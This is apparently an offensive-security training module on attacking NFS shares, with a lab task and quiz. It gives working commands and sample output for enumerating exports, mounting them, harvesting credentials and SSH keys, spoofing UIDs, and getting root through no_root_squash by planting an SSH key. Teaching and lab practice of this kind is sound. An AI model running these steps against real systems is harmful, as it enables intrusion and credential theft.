# NFS Shares

**Roadmap:** Phase 2: Offensive Core → Part 4: Footprinting and Reconnaissance → Stage 5: IPv6 & Protocol Enumeration

# Section 1 — What it is and where it sits

NFS (Network File System) is a distributed file system protocol allowing clients to mount and access remote file systems over a network as if they were local disks. It is dominant in Unix/Linux environments — DevOps infrastructure, build servers, CI/CD pipelines, and HPC clusters routinely export NFS shares for shared storage. NFS runs on TCP/UDP port 2049 and uses the RPC portmapper on port 111 to register its services.

NFS's security model is fundamentally different from SMB/CIFS: NFS v2/v3 does not use cryptographic authentication. Instead, access control relies on the client's IP address (or hostname) and the client's Unix UID/GID. A server configured with `no_root_squash` trusts the client's UID 0 completely — meaning if you mount the share as root on your Kali machine, you have root-equivalent access to every file on the export, regardless of file permissions.

```text
Stage 5 — NFS Shares
────────────────────────────────────────────────────────────────────
Port Scan finds 2049/TCP  →  [NFS Enumeration]  →  Direct file access
or 111/TCP (portmapper)        ↑ YOU ARE HERE       credential files
                               showmount -e          SSH key theft
                               mount                 no_root_squash
                               UID spoofing          → root file write
────────────────────────────────────────────────────────────────────
Tools: showmount, rpcinfo, nmap nfs-* scripts, mount
```

---

# Section 2 — How attackers actually use this

## 2.1 NFS service discovery with rpcinfo and nmap

```bash
# Check if NFS is registered with the portmapper
$ rpcinfo -p 203.0.113.45
   program vers proto   port  service
    100000    4   tcp    111  portmapper
    100003    4   tcp   2049  nfs        ← NFS is running
    100003    4   udp   2049  nfs
    100005    3   tcp   57422 mountd     ← mount daemon
    100005    3   udp   57422 mountd
    100024    1   tcp   57423 status
    100021    4   tcp   57424 nlockmgr   ← NFS lock manager

# nmap NFS enumeration scripts
$ nmap -sV -p 111,2049 --script nfs-showmount,nfs-ls,nfs-statfs 203.0.113.45

PORT     STATE SERVICE VERSION
111/tcp  open  rpcbind 2-4 (RPC #100000)
| rpcinfo:
|   100003  3,4         2049/tcp   nfs
|   100005  1,2,3       57422/tcp  mountd

2049/tcp open  nfs     3-4 (RPC #100003)
| nfs-showmount:
|   /export/data  *             ← exported to everyone (*)
|   /export/www   10.0.0.0/8   ← exported to 10.0.0.0/8 network
|   /backup       192.168.1.0/24
|_ /home          10.10.0.5     ← exported to specific IP only
```

The export list reveals: `/export/data` is accessible from any IP (`*` means world-readable). `/backup` requires being in the `192.168.1.0/24` network.

## 2.2 Listing exports with showmount

`showmount` queries the NFS mount daemon to list available exports without mounting them:

```bash
# List all exports
$ showmount -e 203.0.113.45

Export list for 203.0.113.45:
/export/data  *
/export/www   10.0.0.0/8
/backup       192.168.1.0/24
/home         10.10.0.5

# List all clients currently mounting shares
$ showmount -a 203.0.113.45
All mount points on 203.0.113.45:
10.10.0.20:/export/data    ← FS01 is mounting this
10.10.0.30:/export/www     ← WEB01 is mounting this
10.10.0.100:/backup        ← backup server mounting this

# The client list reveals internal IP addresses of systems using this NFS server
# 10.10.0.20, 10.10.0.30, 10.10.0.100 are all live internal hosts
```

## 2.3 Mounting NFS shares without credentials

If the export is accessible from your IP (either world-accessible `*` or your IP is in the allowed range), you can mount it directly:

```bash
# Create mount point
$ mkdir /mnt/nfs_target

# Mount NFS share (NFSv3)
$ sudo mount -t nfs 203.0.113.45:/export/data /mnt/nfs_target

# Mount specific NFS version
$ sudo mount -t nfs -o vers=3 203.0.113.45:/export/data /mnt/nfs_target

# List mounted content
$ ls -la /mnt/nfs_target/

total 128
drwxr-xr-x  8 1001 1001  4096 Aug 28 10:00 .
drwxr-xr-x 10 root root  4096 Aug 28 09:00 ..
drwxr-xr-x  2 1001 1001  4096 Aug 01 15:30 configs
-rw-r--r--  1 1001 1001  2048 Aug 15 09:15 database.conf   ← config file!
drwxrwxr-x  2 1001 1001  4096 Aug 25 14:00 uploads
-rwxr-xr-x  1 root root  8192 Jan 01 2024 deploy.sh
-rw-------  1 0    0     1024 Jul 20 11:30 .ssh             ← root-owned hidden dir

# Files owned by uid=1001 — but uid=0 (root) owns .ssh
# On NFS v3, these UIDs are trusted from the client side

# Read a configuration file
$ cat /mnt/nfs_target/database.conf
DB_HOST=10.10.0.10
DB_PORT=5432
DB_NAME=production
DB_USER=prod_app
DB_PASS=Pr0ductionP4ss!    ← database credential exposed

# Unmount when done
$ sudo umount /mnt/nfs_target
```

## 2.4 no_root_squash — the critical NFS misconfiguration

By default, NFS applies "root squashing" — if a client connects as UID 0 (root), the server maps it to the `nobody` user (UID 65534), preventing root access to files. `no_root_squash` disables this safety mechanism entirely — the server trusts the client's UID 0 as actual root.

```bash
# Check if no_root_squash is configured (read /etc/exports on the server if accessible)
$ cat /etc/exports   # on the NFS server
/export/data    *(rw,sync,no_root_squash)   ← no_root_squash IS set — critical!
/backup         192.168.1.0/24(rw,sync)     ← root_squash by default — safer

# How to detect no_root_squash from the client side:
# Attempt to read a root-owned file (uid=0, mode 600)
$ ls -la /mnt/nfs_target/
-rw-------  1 root root  512 Jul 20 .ssh/authorized_keys   ← root-owned

$ sudo cat /mnt/nfs_target/.ssh/authorized_keys   # run as root on your machine
# If it returns content → no_root_squash is set
# If it returns "Permission denied" → root squashing is active

# Exploitation with no_root_squash — write SSH authorized_keys for root
$ sudo su -   # become root on your Kali machine
# root@kali:

# Generate a keypair
$ ssh-keygen -t ed25519 -f /tmp/nfs_key -N ""

# Write your public key to root's authorized_keys on the NFS share
$ sudo mkdir -p /mnt/nfs_target/root/.ssh
$ sudo cp /tmp/nfs_key.pub /mnt/nfs_target/root/.ssh/authorized_keys
$ sudo chmod 600 /mnt/nfs_target/root/.ssh/authorized_keys

# SSH into the target as root using the written key
$ ssh -i /tmp/nfs_key root@203.0.113.45
root@WEB01:~#    ← root shell achieved
```

`no_root_squash` with a world-accessible NFS export is a direct root compromise: mount the share as root, write your SSH public key to `/root/.ssh/authorized_keys`, and SSH in as root. This requires no exploit code, no CVE, and no credential cracking.

## 2.5 UID spoofing for file access

Even without `no_root_squash`, any file owned by a known UID (e.g., uid=1001) is readable/writable by creating a local user with the same UID on your Kali machine:

```bash
# Target file is owned by uid=1001, permissions: -rw-------
$ ls -la /mnt/nfs_target/private_data.txt
-rw-------  1 1001 1001  4096 Aug 28 private_data.txt

# Create a user with uid=1001 on your Kali machine
$ sudo useradd -u 1001 -m ghost_user

# Switch to that user
$ sudo su ghost_user
ghost_user@kali:

# Now read the file as uid=1001 — NFS trusts the UID from the client
$ cat /mnt/nfs_target/private_data.txt
[file contents — accessible because NFS sees uid=1001]

# Can also write files as uid=1001
$ echo "injected content" >> /mnt/nfs_target/private_data.txt
```

NFS v3 has no cryptographic user authentication — it trusts whatever UID the client reports. Any file accessible to a specific UID on the server is accessible to anyone who creates a local user with that UID on a system that can mount the share.

## 2.6 nfs-ls for listing without mounting

The `nmap nfs-ls` script can list share contents without mounting — useful when you want to survey the share before committing to mounting:

```bash
$ nmap -p 2049 --script nfs-ls 203.0.113.45

| nfs-ls: Volume /export/data
|   access: Read Lookup Modify Extend Delete NoExecute
|   CONTENTS
|     drwxr-xr-x  uid: 1001  gid: 1001   4096  Aug 01 2024  configs
|     -rw-r--r--  uid: 1001  gid: 1001   2048  Aug 15 2024  database.conf
|     drwxrwxrwx  uid: 0     gid: 0      4096  Aug 25 2024  uploads     ← world-writable!
|     -rw-------  uid: 0     gid: 0      1024  Jul 20 2024  .env        ← root-owned!

# nfs-statfs — filesystem statistics
$ nmap -p 2049 --script nfs-statfs 203.0.113.45

| nfs-statfs:
|   Filesystem     1K-blocks    Used  Available  Use%  Maxfilesize  Maxlink
|   /export/data   102400000  52000    50400000   51%     16.0T        32000
```

`drwxrwxrwx uid:0` (world-writable directory owned by root) — even with root squashing, you can write files into this directory as any user. If it's an upload or web directory, writing a PHP webshell succeeds here.

## 2.7 Targeting sensitive files on NFS shares

A checklist of high-value files to look for after mounting:

```bash
# After mounting to /mnt/nfs_target:

# Credential and configuration files
$ find /mnt/nfs_target -name "*.conf" -o -name "*.env" -o -name "*.config" 2>/dev/null
$ find /mnt/nfs_target -name "*.pem" -o -name "*.key" -o -name "id_rsa*" 2>/dev/null
$ find /mnt/nfs_target -name "*.yml" -o -name "*.yaml" | xargs grep -l "password\|secret\|token" 2>/dev/null
$ find /mnt/nfs_target -name ".env*" 2>/dev/null

# SSH keys
$ find /mnt/nfs_target -path "*/.ssh/*" -name "id_*" 2>/dev/null
/mnt/nfs_target/home/jsmith/.ssh/id_rsa   ← private SSH key!
/mnt/nfs_target/home/jsmith/.ssh/authorized_keys

# Copy SSH key and use
$ cp /mnt/nfs_target/home/jsmith/.ssh/id_rsa /tmp/jsmith_key
$ chmod 600 /tmp/jsmith_key
$ ssh -i /tmp/jsmith_key jsmith@203.0.113.45

# Backup files
$ find /mnt/nfs_target -name "*.bak" -o -name "*.backup" -o -name "*.sql" 2>/dev/null

# Source code with hardcoded credentials
$ grep -r "password\|passwd\|secret\|api_key\|token" /mnt/nfs_target/ \
  --include="*.php" --include="*.py" --include="*.rb" --include="*.js" \
  -l 2>/dev/null
```

## 2.8 NFSv4, Kerberos auth, and /etc/exports analysis

NFSv4 introduced significant security improvements over v3: native support for Kerberos authentication (`sec=krb5`, `sec=krb5i`, `sec=krb5p`), proper ACL support, and a unified port (2049 only, no portmapper dependency). Understanding the difference changes the attack approach:

```bash
# Determine NFS version from rpcinfo
$ rpcinfo -p 203.0.113.45 | grep nfs
   100003    3   tcp   2049  nfs   ← NFSv3 registered
   100003    4   tcp   2049  nfs   ← NFSv4 also registered (dual-stack)

# Check security flavor of the export (NFSv4 specific)
# If the server advertises sec=krb5, Kerberos is required:
$ nmap -p 2049 --script nfs-showmount 203.0.113.45
| nfs-showmount:
|_  /export/data  * (sec=sys)        ← sec=sys = UID-based, no Kerberos → exploitable
                                       sec=krb5 would mean Kerberos required

# Mount with explicit security flavor
$ sudo mount -t nfs4 -o sec=sys 203.0.113.45:/export/data /mnt/nfs   ← standard UID auth
$ sudo mount -t nfs4 -o sec=krb5 203.0.113.45:/export/sec /mnt/sec   ← requires valid Kerberos TGT

# /etc/exports format — understanding what each option means
# If you can read /etc/exports (e.g., via a misconfigured read, or from another mount):
$ cat /etc/exports

/export/data    *(rw,sync,no_root_squash)
# * = any IP; rw = read-write; no_root_squash = attacker root = server root
# → CRITICAL misconfiguration (see section 2.4)

/backup         192.168.1.0/24(rw,sync,root_squash)
# restricted to /24; root_squash = safe from root abuse

/export/www     10.10.0.30(rw,sync,no_subtree_check,anonuid=33,anongid=33)
# anonuid=33 = map anonymous to uid 33 (www-data on Debian/Ubuntu)
# → Files created on this share appear owned by www-data
# → Can write webshells if /export/www is the web root

/home           *(ro,sync,no_root_squash,fsid=0)
# ro = read-only — still readable; fsid=0 = NFS4 root export

# NFS export option risk matrix:
# no_root_squash    → CRITICAL: client root = server root
# rw                → Can write — escalation if writable web/home dir
# *                 → World-accessible → any IP can mount
# no_subtree_check  → Performance option, minor security implication
# anonuid/anongid   → Sets UID for unauthenticated clients
# insecure          → Allows non-privileged port connections (broadens client pool)
# sec=sys (default) → UID-based auth — exploitable with UID spoofing
# sec=krb5          → Kerberos required — significant barrier without domain credentials
```

**NFSv4 ACL behavior:** Even when root squashing is active, NFSv4 ACLs can grant specific UID access that is broader than POSIX permissions appear:

```bash
# Check NFSv4 ACLs on mounted files (requires nfs4-acl-tools)
$ sudo apt install nfs4-acl-tools
$ nfs4_getfacl /mnt/nfs/restricted_dir/

# Output:
# A::OWNER@:rwaDxtTnNcCy   ← owner has full access
# A::GROUP@:tcy            ← group has traverse only
# A::EVERYONE@:tcy         ← everyone: traverse only

# If EVERYONE@ has read (r) access → files accessible to any UID despite POSIX 750
$ nfs4_getfacl /mnt/nfs/confidential.db
# A::EVERYONE@:rwtcy   ← world-readable via NFSv4 ACL (POSIX perms may show 600!)
# POSIX 600 shows no public read, but NFSv4 ACL overrides this on NFSv4 mounts
```

NFSv4 ACLs and POSIX permissions coexist but can conflict — the more permissive rule often wins depending on server configuration. Files that appear locked down (mode 600) may be readable by all clients via permissive NFSv4 ACLs. This is a frequently missed attack vector.

```text
NFS finding severity matrix (for report prioritization):

  Finding                                    Severity   Impact
  ──────────────────────────────────────────────────────────────────────
  Export with no_root_squash + rw + *        CRITICAL   Trivial root shell
  Export with rw + * (root_squash)           HIGH       Arbitrary file write as any UID
  Export with no_root_squash (IP restricted) HIGH       Root if pivot available in range
  Export accessible from broad subnet /16    HIGH       Large attacker pool
  SSH private key found on mounted share     CRITICAL   Immediate credential access
  Database config with plaintext password    HIGH       DB access without exploit
  Source code with hardcoded secrets         HIGH       App/API credential exposure
  World-writable directory on web root NFS   CRITICAL   Webshell write → RCE
  sec=sys (no Kerberos) on sensitive export  MEDIUM     UID spoofing possible
  sec=krb5 on all exports                    LOW        Kerberos required (mitigated)
  Backup files (.bak, .sql) on share         MEDIUM     Historical data exposure
  showmount -a reveals internal IPs          INFO       Host inventory from client list
```

---

# Section 3 — Core concepts and terminology

| Term | Definition |
|------|-----------|
| **NFS** | Network File System — Unix/Linux distributed file system protocol, TCP/UDP port 2049 |
| **Portmapper** | RPC service on port 111 mapping RPC program numbers to listening ports; NFS registers here |
| **showmount** | Tool querying the NFS mount daemon for exported shares and current mounts |
| **Export** | An NFS share — a directory on the NFS server made available to clients |
| **/etc/exports** | NFS server configuration file defining which directories are exported and to which clients |
| **root squashing** | NFS default behavior mapping UID 0 from clients to `nobody` to prevent root access |
| **no_root_squash** | Export option disabling root squashing — client root is trusted as server root; critical misconfiguration |
| **UID spoofing** | Creating a local user with a specific UID to gain NFS access to files owned by that UID |
| **mountd** | NFS mount daemon handling mount requests; registers with portmapper |
| **NFS v3** | Third version of NFS — no authentication, trusts client UIDs |
| **NFS v4** | Fourth version with optional Kerberos authentication and ACLs |
| **nfs-showmount** | Nmap NSE script listing NFS exports without mounting |
| **nfs-ls** | Nmap NSE script listing NFS share contents without mounting |
| **World-accessible export** | Export with `*` in the allowed hosts field — accessible from any IP address |
| **rpcinfo** | Tool querying the RPC portmapper for registered services |

---

# Section 4 — Tools and commands

| Tool | Command | What it finds | When to use |
|------|---------|--------------|------------|
| `rpcinfo` | `rpcinfo -p 203.0.113.45` | All RPC services including NFS | Discovery |
| `showmount -e` | `showmount -e 203.0.113.45` | NFS exports list | After NFS confirmed |
| `showmount -a` | `showmount -a 203.0.113.45` | Current mount clients | Internal IP discovery |
| `nmap nfs-*` | `nmap -p 2049 --script nfs-showmount,nfs-ls 203.0.113.45` | Exports + contents | No-mount survey |
| `mount` | `mount -t nfs target:/share /mnt/point` | Mount and access share | Full access |
| `find` | `find /mnt/nfs -name "id_rsa" -o -name ".env"` | Sensitive files on share | Post-mount |

**Complete NFS enumeration pipeline:**
```bash
TARGET="203.0.113.45"

# Step 1: Confirm NFS is running
$ rpcinfo -p $TARGET | grep nfs

# Step 2: List exports
$ showmount -e $TARGET | tee nfs_exports.txt

# Step 3: Check accessible exports (no-mount listing)
$ nmap -p 2049 --script nfs-ls,nfs-showmount,nfs-statfs $TARGET

# Step 4: Mount accessible share
$ sudo mkdir -p /mnt/nfs
$ sudo mount -t nfs $TARGET:/export/data /mnt/nfs

# Step 5: Check no_root_squash
$ ls -la /mnt/nfs/ | grep "root"
# If root-owned files are visible + readable → no_root_squash confirmed

# Step 6: Hunt sensitive files
$ find /mnt/nfs -name "*.env" -o -name "id_rsa" -o -name "*.conf" 2>/dev/null

# Step 7: Unmount
$ sudo umount /mnt/nfs
```

---

# Section 5 — Defender detection

- **showmount queries:** `showmount -e` sends a request to the mountd daemon on a dynamic port (registered via portmapper). This generates a mountd access log entry with the source IP. Many organizations do not monitor mountd access logs, but it is logged.
- **NFS mount:** A successful NFS mount is logged by the NFS server's kernel NFS daemon (`nfsd`) in `/var/log/syslog` or journald, showing the mounting client's IP and the exported path.
- **File access on mounted share:** File reads and writes on NFS shares are logged at the kernel NFS level if NFS audit logging is enabled. By default, NFS servers do not audit every file access — they log connections, not individual file operations.
- **showmount -a:** Querying the client list generates a mountd access log entry in the same way as showmount -e.
- **Mitigation for operators:** (1) `showmount -e` is a low-noise single request — safe to run. (2) Mounting the share generates a persistent log entry that persists after unmounting. (3) If possible, use `nmap nfs-ls` to survey share contents without actually mounting.

---

# Section 6 — Lab task

**Platform:** Kali Linux. TryHackMe "Network Services" room (NFS section) or set up an Ubuntu VM with NFS exported with `no_root_squash`.

**Objective:** Discover NFS exports, mount an accessible share, exploit no_root_squash for privilege escalation to root.

**Steps:**

1. **RPC discovery:** `rpcinfo -p <target>` — confirm NFS is registered
2. **nmap scan:** `nmap -sV -p 111,2049 --script nfs-showmount,nfs-ls <target>`
3. **Export listing:** `showmount -e <target>` — document all exports and access rules
4. **Client listing:** `showmount -a <target>` — note internal client IPs
5. **Mount accessible share:** `sudo mkdir /mnt/nfs && sudo mount -t nfs <target>:/share /mnt/nfs`
6. **List contents with permissions:** `ls -la /mnt/nfs/` — note UIDs of files
7. **Check for root-owned files:** `ls -la /mnt/nfs/ | grep "root"` — if root-owned files readable → no_root_squash
8. **Sensitive file hunt:** `find /mnt/nfs -name "*.conf" -o -name "id_rsa" -o -name ".env" 2>/dev/null`
9. **no_root_squash exploitation:** If confirmed, `sudo cp /tmp/key.pub /mnt/nfs/root/.ssh/authorized_keys && ssh -i /tmp/key root@<target>`
10. **Compile `nfs_intel.md`:** Export list | Access restrictions | no_root_squash Y/N | Files found | Credentials found | Client IPs from showmount -a

```bash
git commit -m "recon(stage5): NFS shares — exports enumerated, no_root_squash: <Y/N> for <target>"
```

---

# Section 7 — Common mistakes

**1. Not checking portmapper (111) before port 2049**
_Why it matters:_ NFS uses dynamic port assignment via portmapper for mountd. If port 111 is filtered but 2049 is open, `rpcinfo` fails but direct NFS mount may still work. Conversely, if 111 is open you can discover all NFS-related services and their exact ports.
_Fix:_ Always scan both 111 and 2049. Use `rpcinfo -p target` when 111 is accessible to get the full NFS service map.

**2. Assuming access restrictions prevent mounting from your IP**
_Why it matters:_ NFS access control based on IP is only as reliable as the IP spoofing prevention. On local segments without RPF (Reverse Path Filtering), source IP spoofing is possible. Additionally, if you've compromised a host that IS in the allowed range, you can mount from that host via the pivot.
_Fix:_ Always note the allowed IP ranges in the export list. Even if your current IP is blocked, identify which compromised hosts would have access.

**3. Skipping the no_root_squash check**
_Why it matters:_ no_root_squash + world-accessible export = trivial root compromise with zero exploit code. This is found regularly in enterprise environments that run NFS for DevOps workflows. Missing this check is missing the most impactful finding of the NFS enumeration.
_Fix:_ After mounting, always run `sudo ls /mnt/nfs/` as root and check if root-owned files (uid=0, mode 600) are readable. If they are, no_root_squash is confirmed.

**4. Not running showmount -a for client discovery**
_Why it matters:_ `showmount -a` reveals internal IP addresses of all systems currently mounting the share. These are confirmed-alive internal hosts — direct additions to the live host inventory.
_Fix:_ Always run `showmount -a` as part of NFS enumeration. Parse the output for RFC1918 addresses and add them to the host inventory.

**5. Leaving mount point active after enumeration**
_Why it matters:_ An active NFS mount appears in `showmount -a` output — anyone querying the NFS server can see your IP is mounting the share. Leaving it mounted also keeps the NFS connection open, generating persistent log entries.
_Fix:_ Always `umount /mnt/nfs` immediately after collecting the needed data.

---

# Section 8 — Move-on gate

1. `showmount -e 203.0.113.45` returns `/data *(rw)`. The entry `*` means any IP can mount, and `rw` means read-write access. You mount the share and run `ls -la /data/` as root and can read a file owned by `root:root` with permissions `600`. Without notes, state what NFS misconfiguration this confirms, write the exact commands to weaponize it for a root shell, and explain why this is a zero-exploit, zero-CVE root compromise.

2. `showmount -a 203.0.113.45` returns: `10.10.0.20:/export/data`, `10.10.0.30:/export/www`. You cannot mount `/export/data` because the export is restricted to `10.10.0.0/24` and your IP is `203.0.113.99`. Without notes, state how you would still access the share, what prerequisite you need, and name the technique this falls under.

3. You mount `/home` from an NFS server and find a directory `/home/jsmith/.ssh/id_rsa` with permissions `-rw-------` and UID `1004`. You are currently running as root on your Kali machine but `cat /mnt/nfs/home/jsmith/.ssh/id_rsa` returns "Permission denied" (root squashing is active). Without notes, describe the exact technique to read this file and write the commands.
